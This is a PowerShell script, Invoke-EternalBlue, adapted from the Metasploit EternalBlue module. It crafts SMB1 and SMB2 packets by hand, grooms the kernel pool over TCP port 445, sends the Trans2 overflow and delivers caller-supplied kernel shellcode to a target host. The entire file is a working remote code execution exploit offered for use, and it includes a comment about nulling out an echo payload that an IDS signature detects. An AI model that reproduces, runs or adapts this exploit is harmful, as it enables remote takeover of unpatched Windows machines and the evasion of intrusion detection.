## Based on Eternal Blue metasploit module by Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius


function Invoke-EternalBlue($target,$shellcode1, $initial_grooms,$max_attempts){

$enc = [system.Text.Encoding]::ASCII


$GROOM_DELTA = 5


function make_kernel_shellcode { 
    [Byte[]] $shellcode = $shellcode1
	return $shellcode
}

function make_kernel_user_payload($ring3) {
    $sc = make_kernel_shellcode
    $sc += [bitconverter]::GetBytes([uint16] ($ring3.length))
    $sc += $ring3
    return $sc
 }
function make_smb2_payload_headers_packet(){
    [Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes("SMB") + [Byte[]](0x00)*124

    return $pkt
}

function make_smb2_payload_body_packet($kernel_user_payload) {
    $pkt_max_len = 4204
    $pkt_setup_len = 497
    $pkt_max_payload = $pkt_max_len - $pkt_setup_len 
    
    #padding
    [Byte[]] $pkt = [Byte[]] (0x00) * 0x8
    $pkt += 0x03,0x00,0x00,0x00
    $pkt += [Byte[]] (0x00) * 0x1c
    $pkt += 0x03,0x00,0x00,0x00
     $pkt += [Byte[]] (0x00) * 0x74

# KI_USER_SHARED_DATA addresses
    $pkt += [Byte[]] (0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff) * 2 # x64 address
    $pkt += [Byte[]] (0x00) * 0x10
    $pkt += [Byte[]] (0xc0,0xf0,0xdf,0xff) * 2                 # x86 address
    $pkt += [Byte[]] (0x00) * 0xc4

    # payload addreses
    $pkt += 0x90,0xf1,0xdf,0xff
    $pkt += [Byte[]] (0x00) * 0x4
    $pkt += 0xf0,0xf1,0xdf,0xff
    $pkt += [Byte[]] (0x00) * 0x40

    $pkt += 0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
    $pkt += [Byte[]] (0x00) * 0x8
    $pkt += 0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff
    $pkt += 0x00

    $pkt += $kernel_user_payload

    # fill out the rest, this can be randomly generated
    $pkt += 0x00 * ($pkt_max_payload - $kernel_user_payload.length)

    return  $pkt
}

function make_smb1_echo_packet($tree_id, $user_id) {
    [Byte[]]  $pkt = [Byte[]] (0x00)               # type
    $pkt += 0x00,0x00,0x31       # len = 49
    $pkt += [Byte[]] (0xff) + $enc.GetBytes("SMB")            # SMB1
    $pkt += 0x2b               # Echo
    $pkt += 0x00,0x00,0x00,0x00   # Success
    $pkt += 0x18               # flags
    $pkt += 0x07,0xc0           # flags2
    $pkt += 0x00,0x00           # PID High
    $pkt += 0x00,0x00,0x00,0x00   # Signature1
    $pkt += 0x00,0x00,0x00,0x00   # Signature2
    $pkt += 0x00,0x00           # Reserved
    $pkt += $tree_id # Tree ID
    $pkt += 0xff,0xfe           # PID
    $pkt += $user_id # UserID
    $pkt += 0x40,0x00           # MultiplexIDs

    $pkt += 0x01               # Word count
    $pkt += 0x01,0x00           # Echo count
    $pkt += 0x0c,0x00           # Byte count

    # echo data
    # this is an existing IDS signature, and can be nulled out
    #$pkt += 0x4a,0x6c,0x4a,0x6d,0x49,0x68,0x43,0x6c,0x42,0x73,0x72,0x00
    $pkt +=  0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00
    return $pkt
}

function make_smb1_trans2_exploit_packet($tree_id, $user_id, $type, $timeout) {
    $timeout = ($timeout * 0x10) + 3
 
    [Byte[]]  $pkt = [Byte[]] (0x00)                   # Session message
    $pkt += 0x00,0x10,0x35           # length
    $pkt += 0xff,0x53,0x4D,0x42                # SMB1
    $pkt += 0x33                   # Trans2 request
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += $user_id       # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += $user_id     # UserID
    $pkt += 0x40,0x00               # MultiplexIDs

    $pkt += 0x09                   # Word Count
    $pkt += 0x00,0x00               # Total Param Count
    $pkt += 0x00,0x10               # Total Data Count
    $pkt += 0x00,0x00               # Max Param Count
    $pkt += 0x00,0x00               # Max Data Count
    $pkt += 0x00                   # Max Setup Count
    $pkt += 0x00                   # Reserved
    $pkt += 0x00,0x10               # Flags
    $pkt += 0x35,0x00,0xd0           # Timeouts
    $pkt += [bitconverter]::GetBytes($timeout)[0] #timeout is a single int
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x10               # Parameter Count

    #$pkt += 0x74,0x70               # Parameter Offset
    #$pkt += 0x47,0x46               # Data Count
    #$pkt += 0x45,0x6f               # Data Offset
    #$pkt += 0x4c                   # Setup Count
    #$pkt += 0x4f                   # Reserved

    if ($type -eq "eb_trans2_exploit") {

      $pkt += [Byte[]] (0x41) * 2957

      $pkt += 0x80,0x00,0xa8,0x00                     # overflow

      $pkt += [Byte[]] (0x00) * 0x10
      $pkt += 0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x6
      $pkt += 0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x16

      $pkt += 0x00,0xf1,0xdf,0xff             # x86 addresses
      $pkt += [Byte[]] (0x00) * 0x8
      $pkt += 0x20,0xf0,0xdf,0xff

      $pkt += 0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff # x64

      $pkt += 0x60,0x00,0x04,0x10
      $pkt += [Byte[]] (0x00) * 4

      $pkt += 0x80,0xef,0xdf,0xff

      $pkt += [Byte[]] (0x00) * 4
      $pkt += 0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff
      $pkt += 0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x10

      $pkt += 0x60,0x00,0x04,0x10
      $pkt += [Byte[]] (0x00) * 0xc
      $pkt += 0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff
      $pkt += [Byte[]] (0x00) * 0x8
      $pkt += 0x80,0x10
      $pkt += [Byte[]] (0x00) * 0xe
      $pkt += 0x39
      $pkt += 0xbb

      $pkt += [Byte[]] (0x41) * 965

      return $pkt
    }

    if($type -eq "eb_trans2_zero") {
      $pkt += [Byte[]] (0x00) * 2055
      $pkt += 0x83,0xf3
      $pkt += [Byte[]] (0x41) * 2039
      #$pkt += 0x00 * 4096
     }
    else {
      $pkt += [Byte[]] (0x41) * 4096
    }

    return $pkt
  }
function negotiate_proto_request()
{
    
      [Byte[]]  $pkt = [Byte[]] (0x00)             # Message_Type
      $pkt += 0x00,0x00,0x54       # Length
   
      $pkt += 0xFF,0x53,0x4D,0x42 # server_component: .SMB
      $pkt += 0x72             # smb_command: Negotiate Protocol
      $pkt += 0x00,0x00,0x00,0x00 # nt_status
      $pkt += 0x18             # flags
      $pkt +=  0x01,0x28         # flags2
      $pkt += 0x00,0x00         # process_id_high
      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 # signature
      $pkt += 0x00,0x00         # reserved
      $pkt += 0x00,0x00         # tree_id
      $pkt += 0x2F,0x4B         # process_id
      $pkt += 0x00,0x00         # user_id
      $pkt += 0xC5,0x5E           # multiplex_id
 
      $pkt += 0x00             # word_count
      $pkt += 0x31,0x00         # byte_count

      # Requested Dialects
      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00  # dialet_name: LANMAN1.0

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00  # dialet_name: LM1.2X002

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 # dialet_name3: NT LANMAN 1.0

      $pkt += 0x02             # dialet_buffer_format
      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   # dialet_name4: NT LM 0.12
      
      return $pkt
}


function make_smb1_nt_trans_packet($tree_id, $user_id) { 

    [Byte[]]  $pkt = [Byte[]] (0x00)                   # Session message
    $pkt += 0x00,0x04,0x38           # length
    $pkt += 0xff,0x53,0x4D,0x42       # SMB1
    $pkt += 0xa0                   # NT Trans
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += $tree_id       # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += $user_id       # UserID
    $pkt += 0x40,0x00               # MultiplexID

    $pkt += 0x14                   # Word Count
    $pkt += 0x01                   # Max Setup Count
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x1e,0x00,0x00,0x00       # Total Param Count
    $pkt += 0xd0,0x03,0x01,0x00       # Total Data Count
    $pkt += 0x1e,0x00,0x00,0x00       # Max Param Count
    $pkt += 0x00,0x00,0x00,0x00       # Max Data Count
    $pkt += 0x1e,0x00,0x00,0x00       # Param Count
    $pkt += 0x4b,0x00,0x00,0x00       # Param Offset
    $pkt += 0xd0,0x03,0x00,0x00       # Data Count
    $pkt += 0x68,0x00,0x00,0x00       # Data Offset
    $pkt += 0x01                   # Setup Count
    $pkt += 0x00,0x00               # Function <unknown>
    $pkt += 0x00,0x00               # Unknown NT transaction (0) setup
    $pkt += 0xec,0x03               # Byte Count
    $pkt += [Byte[]] (0x00) * 0x1f            # NT Parameters

    # undocumented
    $pkt += 0x01
    $pkt += [Byte[]](0x00) * 0x3cd
    return $pkt
  }

  function  make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) { 
     
    [Byte[]] $pkt = 0x00                   # Session message
    $pkt += 0x00,0x00,0x51           # length
    $pkt += 0xff,0x53,0x4D,0x42       # SMB1
    $pkt += 0x73                   # Session Setup AndX
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += $flags2                   # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x00               # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += 0x00,0x00               # UserID
    $pkt += 0x40,0x00               # MultiplexID
    #$pkt += 0x00,0x00               # Reserved

    $pkt += 0x0c                   # Word Count
    $pkt += 0xff                   # No further commands
    $pkt += 0x00                   # Reserved
    $pkt += 0x00,0x00               # AndXOffset
    $pkt += 0x04,0x11               # Max Buffer
    $pkt += 0x0a,0x00               # Max Mpx Count
    $pkt += $vcnum                    # VC Number
    $pkt += 0x00,0x00,0x00,0x00       # Session key
    $pkt += 0x00,0x00               # Security blob length
    $pkt += 0x00,0x00,0x00,0x00       # Reserved
    $pkt += 0x00,0x00,0x00,0x80       # Capabilities
    $pkt += 0x16,0x00               # Byte count
    #$pkt += 0xf0                   # Security Blob: <MISSING>
    #$pkt += 0xff,0x00,0x00,0x00       # Native OS
    #$pkt += 0x00,0x00               # Native LAN manager
    #$pkt += 0x00,0x00               # Primary domain
    $pkt += $native_os
    $pkt += [Byte[]] (0x00) * 17              # Extra byte params

    return $pkt
  }

  function  make_smb1_anonymous_login_packet {
    # Neither Rex nor RubySMB appear to support Anon login?
    
    [Byte[]] $pkt = [Byte[]] (0x00)                    # Session message
    $pkt += 0x00,0x00,0x88           # length
    $pkt += 0xff,0x53,0x4D,0x42             # SMB1
    $pkt += 0x73                   # Session Setup AndX
    $pkt += 0x00,0x00,0x00,0x00       # NT SUCCESS
    $pkt += 0x18                   # Flags
    $pkt += 0x07,0xc0               # Flags2
    $pkt += 0x00,0x00               # PID High
    $pkt += 0x00,0x00,0x00,0x00       # Signature1
    $pkt += 0x00,0x00,0x00,0x00       # Signature2
    $pkt += 0x00,0x00               # TreeID
    $pkt += 0xff,0xfe               # PID
    $pkt += 0x00,0x00               # Reserved
    $pkt += 0x00,0x00               # UserID
    $pkt += 0x40,0x00               # MultiplexID

    $pkt += 0x0d                   # Word Count
    $pkt += 0xff                   # No further commands
    $pkt += 0x00                   # Reserved
    $pkt += 0x88,0x00               # AndXOffset
    $pkt += 0x04,0x11               # Max Buffer
    $pkt += 0x0a,0x00               # Max Mpx Count
    $pkt += 0x00,0x00               # VC Number
    $pkt += 0x00,0x00,0x00,0x00       # Session key
    $pkt += 0x01,0x00               # ANSI pw length
    $pkt += 0x00,0x00               # Unicode pw length
    $pkt += 0x00,0x00,0x00,0x00       # Reserved
    $pkt += 0xd4,0x00,0x00,0x00       # Capabilities
    $pkt += 0x4b,0x00               # Byte count
    $pkt += 0x00                   # ANSI pw
    $pkt += 0x00,0x00               # Account name
    $pkt += 0x00,0x00               # Domain name

    # Windows 2000 2195
    $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x32,0x00,0x31,0x00,0x39,0x00,0x35,0x00
    $pkt += 0x00,0x00

    # Windows 2000 5.0
    $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32
    $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x00,0x00

    return $pkt
}


function tree_connect_andx_request($target, $userid) { 

     [Byte[]] $pkt = [Byte[]](0x00)              #$pkt +=Message_Type'
     $pkt +=0x00,0x00,0x47       #$pkt +=Length'
    

     $pkt +=0xFF,0x53,0x4D,0x42  #$pkt +=server_component': .SMB
     $pkt +=0x75              #$pkt +=smb_command': Tree Connect AndX
     $pkt +=0x00,0x00,0x00,0x00  #$pkt +=nt_status'
     $pkt +=0x18              #$pkt +=flags'
     $pkt +=0x01,0x20          #$pkt +=flags2'
     $pkt +=0x00,0x00          #$pkt +=process_id_high'
     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  #$pkt +=signature'
     $pkt +=0x00,0x00          #$pkt +=reserved'
     $pkt +=0x00,0x00          #$pkt +=tree_id'
     $pkt +=0x2F,0x4B          #$pkt +=process_id'
     $pkt += $userid              #$pkt +=user_id'
     $pkt +=0xC5,0x5E           #$pkt +=multiplex_id'
    

    $ipc = "\\"+ $target + "\IPC$"

     $pkt +=0x04              # Word Count
     $pkt +=0xFF              # AndXCommand: No further commands
     $pkt +=0x00              # Reserved
     $pkt +=0x00,0x00          # AndXOffset
     $pkt +=0x00,0x00          # Flags
     $pkt +=0x01,0x00          # Password Length
     $pkt +=0x1A,0x00          # Byte Count
     $pkt +=0x00              # Password
     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) # \,0xxx.xxx.xxx.xxx\IPC$
     $pkt += 0x00       # null byte after ipc added by kev

     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00   # Service
    

    $len = $pkt.Length - 4
    # netbios[1] =$pkt +=0x00' + struct.pack('>H length)
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt

    }



function smb_header($smbheader) {

$parsed_header =@{server_component=$smbheader[0..3];
                  smb_command=$smbheader[4];
                  error_class=$smbheader[5];
                  reserved1=$smbheader[6];
                  error_code=$smbheader[6..7];
                  flags=$smbheader[8];
                  flags2=$smbheader[9..10];
                  process_id_high=$smbheader[11..12];
                  signature=$smbheader[13..21];
                  reserved2=$smbheader[22..23];
                  tree_id=$smbheader[24..25];
                  process_id=$smbheader[26..27];
                  user_id=$smbheader[28..29];
                  multiplex_id=$smbheader[30..31];
                 }
return $parsed_header

}




function smb1_get_response($sock){

   

    $tcp_response = [Array]::CreateInstance("byte", 1024)
    try{
    $sock.Receive($tcp_response)| out-null

     }
     catch {
      Write-Verbose "socket error, exploit may fail "
     }
    $netbios = $tcp_response[0..4]
    $smb_header = $tcp_response[4..36]  # SMB Header: 32 bytes
    $parsed_header = smb_header($smb_header)
    
    return $tcp_response, $parsed_header

}


function client_negotiate($sock){
$raw_proto = negotiate_proto_request
    $sock.Send($raw_proto) | out-null
    return smb1_get_response($sock)

}

function smb1_anonymous_login($sock){
    $raw_proto = make_smb1_anonymous_login_packet
    $sock.Send($raw_proto) | out-null
   return smb1_get_response($sock)
    

}

function tree_connect_andx($sock, $target, $userid){
    $raw_proto = tree_connect_andx_request $target $userid
    $sock.Send($raw_proto) | out-null
   return smb1_get_response($sock)
    

}


function smb1_anonymous_connect_ipc($target)
{
    $client = New-Object System.Net.Sockets.TcpClient($target,445)
    
    $sock = $client.Client
    client_negotiate($sock) | Out-Null

    $raw, $smbheader = smb1_anonymous_login $sock

    $raw, $smbheader = tree_connect_andx $sock $target $smbheader.user_id

    
    return $smbheader, $sock 



}


function smb1_large_buffer($smbheader,$sock){

    $nt_trans_pkt = make_smb1_nt_trans_packet $smbheader.tree_id $smbheader.user_id
    
    # send NT Trans

    $sock.Send($nt_trans_pkt) | out-null

    $raw, $transheader = smb1_get_response($sock)

    #initial trans2 request
    $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_zero" 0

    #send all but the last packet
    for($i =1; $i -le 14; $i++) {
        $trans2_pkt_nulled += make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_buffer" $i

    }
    
    $trans2_pkt_nulled += make_smb1_echo_packet $smbheader.tree_id  $smbheader.user_id
    $sock.Send($trans2_pkt_nulled) | out-null

    smb1_get_response($sock) | Out-Null

}


function smb1_free_hole($start) {
   $client = New-Object System.Net.Sockets.TcpClient($target,445)
    
    $sock = $client.Client
    client_negotiate($sock) | Out-Null
    if($start) {
        $pkt =  make_smb1_free_hole_session_packet (0x07,0xc0) (0x2d,0x01) (0xf0,0xff,0x00,0x00,0x00)
    } 
    else {
        $pkt =  make_smb1_free_hole_session_packet (0x07,0x40) (0x2c,0x01) (0xf8,0x87,0x00,0x00,0x00)
    }

    $sock.Send($pkt) | out-null
    smb1_get_response($sock) | Out-Null
    return $sock
}

     function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){
        

         for($i =0; $i -lt $grooms; $i++)
         {
            $client = New-Object System.Net.Sockets.TcpClient($target,445)
    
             $gsock = $client.Client
             $groom_socks += $gsock
             $gsock.Send($payload_hdr_pkt) | out-null

         }
        return $groom_socks
     }




function smb_eternalblue($target, $grooms) {


    #replace null bytes with your shellcode
    [Byte[]]  $payload = [Byte[]](0x00,0x00,0x00)
  
    $shellcode = make_kernel_user_payload($payload)
    $payload_hdr_pkt = make_smb2_payload_headers_packet
    $payload_body_pkt = make_smb2_payload_body_packet($shellcode)

    Write-Verbose "Connecting to target for activities" 
     $smbheader, $sock = smb1_anonymous_connect_ipc($target)
     $sock.ReceiveTimeout =2000
     Write-Verbose "Connection established for exploitation."
           # Step 2: Create a large SMB1 buffer
           Write-Verbose  "all but last fragment of exploit packet"
     smb1_large_buffer $smbheader $sock
           # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
     
     # initialize_groom_threads(ip, port, payload, grooms)
     $fhs_sock = smb1_free_hole $true 
     $groom_socks =@()
     $groom_socks = smb2_grooms $target $grooms $payload_hdr_pkt $groom_socks

     $fhf_sock = smb1_free_hole $false 
     
     $fhs_sock.Close() | Out-Null
      
     $groom_socks = smb2_grooms $target 6 $payload_hdr_pkt $groom_socks

     $fhf_sock.Close() | out-null

     Write-Verbose "Running final exploit packet"

     $final_exploit_pkt =  $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_exploit"  15

     try{
     $sock.Send($final_exploit_pkt) | Out-Null
      $raw, $exploit_smb_header = smb1_get_response $sock
      Write-Verbose ("SMB code: " + [System.BitConverter]::ToString($exploit_smb_header.error_code))

     }
     catch {
      Write-Verbose "socket error, exploit may fail horribly"
     }

     
      Write-Verbose "Send the payload with the grooms"
	 try {
		 foreach ($gsock in $groom_socks)
		 {
			$gsock.Send($payload_body_pkt[0..2919]) | out-null
		 }
			foreach ($gsock in $groom_socks)
		 {
			$gsock.Send($payload_body_pkt[2920..4072]) | out-null
		 }
			 foreach ($gsock in $groom_socks) 
		 {
			$gsock.Close() | out-null
		 }
	 }
     catch {
		Write-Verbose "gsock.send error, exploit may fail [602]"
     }

     $sock.Close()| out-null
  }




$VerbosePreference = "continue"
for ($i=0; $i -lt $max_attempts; $i++) {
    $grooms = $initial_grooms + $GROOM_DELTA*$i 
    smb_eternalblue $target $grooms 
}
}